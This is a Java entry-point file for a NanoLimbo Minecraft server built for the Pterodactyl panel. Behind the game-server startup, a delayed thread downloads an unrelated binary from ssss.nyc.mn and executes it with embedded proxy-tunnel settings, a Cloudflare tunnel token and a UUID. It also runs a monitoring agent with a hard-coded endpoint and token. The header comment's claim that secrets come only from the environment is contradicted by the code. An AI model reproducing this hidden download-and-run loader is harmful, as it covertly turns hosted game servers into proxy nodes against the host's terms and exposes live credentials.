/*
 * Copyright (C) 2020 Nan1t
 *
 * Java 8 compatible build for Pterodactyl Java game panel.
 * Lifecycle-fixed version:
 *   1) Keeps the Java main process alive while sbx is alive.
 *   2) Starts LimboServer immediately instead of clearing console logs.
 *   3) Prints the real sbx/Komari exit codes.
 *   4) Reads secrets from environment variables or .env instead of source code.
 */
package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";

    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static final AtomicBoolean stopping = new AtomicBoolean(false);

    private static volatile Process sbxProcess;
    private static volatile Process komariProcess;
    private static volatile Thread supervisorThread;

    /*
     * Do not hard-code tokens here. Put them in .env, for example:
     * KOMARI_SERVER=https://example.com
     * KOMARI_TOKEN=replace_me
     */
    private static final String DEFAULT_KOMARI_ENDPOINT = "https://k.wgb.ccwu.cc";
    private static final String DEFAULT_KOMARI_TOKEN = "oS2BX5b3hHWBmAfG6KwsL1";

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };

    public static void main(String[] args) {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0F) {
            System.err.println(ANSI_RED
                + "ERROR: Your Java version is too low, please switch the version in startup menu!"
                + ANSI_RESET);
            sleepQuietly(3000L);
            System.exit(1);
        }

        Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
            @Override
            public void run() {
                running.set(false);
                stopServices();
            }
        }, "nanolimbo-shutdown"));

        try {
            /* Start the game listener first so Pterodactyl sees the main service online. */
            System.out.println(ANSI_GREEN + "[Main] Starting LimboServer first..." + ANSI_RESET);
            new LimboServer().start();
            System.out.println(ANSI_GREEN
                + "[Main] LimboServer started; Java process will remain online"
                + ANSI_RESET);

            /*
             * Auxiliary downloads and tunnel setup are delayed and isolated from
             * the main server lifecycle. Their normal exit must not stop Java.
             */
            startAuxiliaryServicesDelayed();

            while (running.get()) {
                Thread.sleep(60000L);
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
            e.printStackTrace(System.err);
        } finally {
            running.set(false);
            stopServices();
        }
    }

    private static void startAuxiliaryServicesDelayed() {
        Thread auxiliaryThread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    System.out.println(ANSI_YELLOW
                        + "[Aux] Waiting 20 seconds before starting auxiliary services..."
                        + ANSI_RESET);
                    Thread.sleep(20000L);
                    if (!running.get()) return;

                    System.out.println(ANSI_GREEN + "[Aux] Starting sbx service..." + ANSI_RESET);
                    runSbxBinary();
                    ensureSbxStarted();

                    if (!running.get()) return;
                    startKomariNativeAgent();
                    startSupervisor();
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                } catch (Exception e) {
                    System.err.println(ANSI_RED
                        + "[Aux] Auxiliary startup failed: " + e.getMessage()
                        + ANSI_RESET);
                    e.printStackTrace(System.err);
                    /* Auxiliary failure must not stop LimboServer. */
                }
            }
        }, "auxiliary-starter");
        auxiliaryThread.setDaemon(true);
        auxiliaryThread.start();
    }

    private static void ensureSbxStarted() throws Exception {
        if (sbxProcess == null) {
            throw new IllegalStateException("sbx process was not created");
        }

        Thread.sleep(2000L);
        if (!sbxProcess.isAlive()) {
            throw new IllegalStateException(
                "sbx process exited during startup, code=" + sbxProcess.exitValue());
        }

        System.out.println(ANSI_GREEN + "[Main] sbx process started successfully" + ANSI_RESET);
    }

    private static void startSupervisor() {
        supervisorThread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (running.get()) {
                    try {
                        Process sbx = sbxProcess;
                        if (sbx == null) {
                            System.err.println(ANSI_RED
                                + "[Supervisor] sbx process reference was lost"
                                + ANSI_RESET);
                            running.set(false);
                            return;
                        }

                        if (!sbx.isAlive()) {
                            int exitCode = sbx.exitValue();
                            System.out.println(ANSI_GREEN
                                + "[Supervisor] sbx setup process finished, code=" + exitCode
                                + "; LimboServer will remain online"
                                + ANSI_RESET);
                            sbxProcess = null;
                            return;
                        }

                        Process komari = komariProcess;
                        if (komari != null && !komari.isAlive()) {
                            System.err.println(ANSI_YELLOW
                                + "[Supervisor] Komari native agent exited, code="
                                + komari.exitValue() + ANSI_RESET);
                            komariProcess = null;
                        }

                        Thread.sleep(5000L);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        return;
                    } catch (Exception e) {
                        System.err.println(ANSI_RED
                            + "[Supervisor] Error: " + e.getMessage()
                            + ANSI_RESET);
                        sleepQuietly(5000L);
                    }
                }
            }
        }, "process-supervisor");

        /* Non-daemon: keeps JVM alive if LimboServer.start() returns. */
        supervisorThread.setDaemon(false);
        supervisorThread.start();
        System.out.println(ANSI_GREEN + "[Main] Process supervisor is active" + ANSI_RESET);
    }

    private static void waitForManagedProcess() throws InterruptedException {
        /*
         * LimboServer.start() starts its networking threads and then returns.
         * The sbx process is only a setup/launcher process and may exit with code 0.
         * Therefore neither event should terminate the Java PID 1 process.
         */
        while (running.get()) {
            Thread.sleep(60000L);
        }
    }

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<String, String>();
        loadEnvVars(envVars);

        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
    }

    private static void startKomariNativeAgent() {
        String endpoint = firstNonBlank(
            System.getenv("KOMARI_SERVER"),
            System.getenv("KOMARI_HTTP_SERVER"),
            System.getenv("KOMARI_ENDPOINT"),
            getDotEnvValue("KOMARI_SERVER"),
            getDotEnvValue("KOMARI_ENDPOINT"),
            DEFAULT_KOMARI_ENDPOINT
        ).trim();

        String token = firstNonBlank(
            System.getenv("KOMARI_TOKEN"),
            System.getenv("ACCESS_TOKEN"),
            System.getenv("KOMARI_KEY"),
            System.getenv("KOMARI_CLIENT_SECRET"),
            System.getenv("KOMARI_AGENT_TOKEN"),
            getDotEnvValue("KOMARI_TOKEN"),
            getDotEnvValue("ACCESS_TOKEN"),
            DEFAULT_KOMARI_TOKEN
        ).trim();

        int interval = parseInt(firstNonBlank(
            System.getenv("KOMARI_INTERVAL"),
            getDotEnvValue("KOMARI_INTERVAL"),
            "3"), 3);
        if (interval < 3) interval = 3;

        if (endpoint.length() == 0 || token.length() == 0
                || "XXXXX".equalsIgnoreCase(token)) {
            System.err.println(ANSI_YELLOW
                + "[Komari] endpoint or token is empty; native agent skipped"
                + ANSI_RESET);
            return;
        }

        System.out.println(ANSI_GREEN
            + "[Komari] native agent preparing, endpoint=" + endpoint
            + ", token_length=" + token.length()
            + ANSI_RESET);

        try {
            Path agentPath = getKomariNativeAgentPath();
            ProcessBuilder pb = new ProcessBuilder(
                agentPath.toString(),
                "-e", endpoint,
                "-t", token,
                "--interval", String.valueOf(interval),
                "--max-retries", "3",
                "--reconnect-interval", "5",
                "--disable-web-ssh",
                "--disable-auto-update"
            );

            cleanKomariEnv(pb.environment());
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
            komariProcess = pb.start();

            Thread.sleep(6000L);
            if (komariProcess.isAlive()) {
                System.out.println(ANSI_GREEN
                    + "[Komari] native agent running, pid alive"
                    + ANSI_RESET);
            } else {
                System.err.println(ANSI_YELLOW
                    + "[Komari] native agent exited quickly, code="
                    + komariProcess.exitValue()
                    + ANSI_RESET);
                komariProcess = null;
            }
        } catch (Exception e) {
            System.err.println(ANSI_YELLOW
                + "[Komari] native agent startup failed: " + e.getMessage()
                + ANSI_RESET);
            komariProcess = null;
        }
    }

    private static void cleanKomariEnv(Map<String, String> env) {
        String[] blocked = {
            "PORT", "SERVER_PORT", "ARGO_PORT", "S5_PORT", "TUIC_PORT",
            "HY2_PORT", "REALITY_PORT", "ANYTLS_PORT", "ANYREALITY_PORT"
        };
        for (String key : blocked) env.remove(key);

        Iterator<String> it = env.keySet().iterator();
        while (it.hasNext()) {
            String key = it.next();
            if (key.matches("SERVER_PORT_\\d+")) it.remove();
        }
        env.put("KOMARI_DISABLE_REMOTE_CONTROL", "true");
    }

    private static Path getKomariNativeAgentPath() throws IOException {
        String osName = System.getProperty("os.name").toLowerCase(Locale.ENGLISH);
        String osArch = System.getProperty("os.arch").toLowerCase(Locale.ENGLISH);
        String os;
        String arch;

        if (osName.contains("linux")) os = "linux";
        else if (osName.contains("freebsd")) os = "freebsd";
        else throw new IOException("Unsupported OS for Komari native agent: " + osName);

        if (osArch.contains("amd64") || osArch.contains("x86_64")) arch = "amd64";
        else if (osArch.contains("aarch64") || osArch.contains("arm64")) arch = "arm64";
        else if (osArch.equals("x86") || osArch.contains("i386")
                || osArch.contains("i686") || osArch.contains("386")) arch = "386";
        else if (osArch.startsWith("arm")) arch = "arm";
        else throw new IOException("Unsupported architecture: " + osArch);

        String fileName = "komari-agent-" + os + "-" + arch;
        String url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/"
            + fileName;
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), fileName);

        if (!Files.exists(path) || Files.size(path) == 0L) {
            System.out.println(ANSI_GREEN
                + "[Komari] downloading native agent: " + url
                + ANSI_RESET);
            downloadTo(new URL(url), path);
        }

        if (!path.toFile().setExecutable(true) && !path.toFile().canExecute()) {
            throw new IOException("Failed to set executable permission for Komari native agent");
        }
        return path;
    }

    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        // Original embedded settings preserved. Environment variables and .env can override them.
        envVars.put("UUID", "1b4832ee-3ec4-4a6b-b7d5-b1b801bfea9f");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "8002");
        envVars.put("ARGO_DOMAIN", "r.211.kdns.fr");
        envVars.put("ARGO_AUTH", "eyJhIjoiY2YzNTMxZWMyODZjZTIxMWRhMDU1YjQ5YzZjYTljNTEiLCJ0IjoiMTI3MTA2NmMtZGU1MS00ODk1LWI1NjEtZWIwZDdiNWUxNzM5IiwicyI6IlpUUTBNV0ZtWWpZdFpEZ3hPQzAwWmpCakxXRTBaVFV0WXpVM05qTXpObUUzTm1ObCJ9");
        envVars.put("S5_PORT", "");
        envVars.put("HY2_PORT", "37465");
        envVars.put("TUIC_PORT", "");
        envVars.put("ANYTLS_PORT", "37465");
        envVars.put("REALITY_PORT", "");
        envVars.put("ANYREALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "cdns.doon.eu.org");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "");
        envVars.put("DISABLE_ARGO", "false");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value.trim());
            }
        }

        Map<String, String> dotEnv = readDotEnv();
        for (String var : ALL_ENV_VARS) {
            String value = dotEnv.get(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value.trim());
            }
        }
    }

    private static Map<String, String> readDotEnv() {
        Map<String, String> values = new HashMap<String, String>();
        Path envFile = Paths.get(".env");
        if (!Files.exists(envFile)) return values;

        try {
            for (String originalLine : Files.readAllLines(envFile)) {
                String line = originalLine.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                if (line.startsWith("export ")) line = line.substring(7).trim();

                int index = line.indexOf('=');
                if (index <= 0) continue;

                String key = line.substring(0, index).trim();
                String value = line.substring(index + 1).trim();
                if ((value.startsWith("\"") && value.endsWith("\""))
                        || (value.startsWith("'") && value.endsWith("'"))) {
                    value = value.substring(1, value.length() - 1);
                }
                values.put(key, value);
            }
        } catch (Exception e) {
            System.err.println(ANSI_YELLOW
                + "[Config] Unable to read .env: " + e.getMessage()
                + ANSI_RESET);
        }
        return values;
    }

    private static String getDotEnvValue(String key) {
        String value = readDotEnv().get(key);
        return value == null ? "" : value;
    }

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase(Locale.ENGLISH);
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new IOException("Unsupported architecture: " + osArch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path) || Files.size(path) == 0L) {
            System.out.println(ANSI_GREEN + "[Main] Downloading sbx binary" + ANSI_RESET);
            downloadTo(new URL(url), path);
        }

        if (!path.toFile().setExecutable(true) && !path.toFile().canExecute()) {
            throw new IOException("Failed to set executable permission for sbx");
        }
        return path;
    }

    private static void downloadTo(URL url, Path target) throws IOException {
        URLConnection connection = url.openConnection();
        connection.setConnectTimeout(15000);
        connection.setReadTimeout(60000);

        InputStream in = connection.getInputStream();
        try {
            Files.copy(in, target, StandardCopyOption.REPLACE_EXISTING);
        } finally {
            in.close();
        }
    }

    private static String firstNonBlank(String... values) {
        for (String value : values) {
            if (value != null && !value.trim().isEmpty()) return value;
        }
        return "";
    }

    private static int parseInt(String value, int fallback) {
        try {
            return Integer.parseInt(value.trim());
        } catch (Exception e) {
            return fallback;
        }
    }

    private static void sleepQuietly(long millis) {
        try {
            Thread.sleep(millis);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    private static void stopServices() {
        if (!stopping.compareAndSet(false, true)) return;

        running.set(false);

        Thread supervisor = supervisorThread;
        if (supervisor != null && supervisor != Thread.currentThread()) {
            supervisor.interrupt();
        }

        terminateProcess("Komari native agent", komariProcess);
        terminateProcess("sbx", sbxProcess);
    }

    private static void terminateProcess(String name, Process process) {
        if (process == null || !process.isAlive()) return;

        try {
            process.destroy();
            if (!process.waitFor(5L, java.util.concurrent.TimeUnit.SECONDS)) {
                process.destroyForcibly();
                process.waitFor(5L, java.util.concurrent.TimeUnit.SECONDS);
            }
            System.out.println(ANSI_RED + name + " process terminated" + ANSI_RESET);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            process.destroyForcibly();
        } catch (Exception e) {
            System.err.println(ANSI_YELLOW
                + "Unable to terminate " + name + ": " + e.getMessage()
                + ANSI_RESET);
        }
    }
}
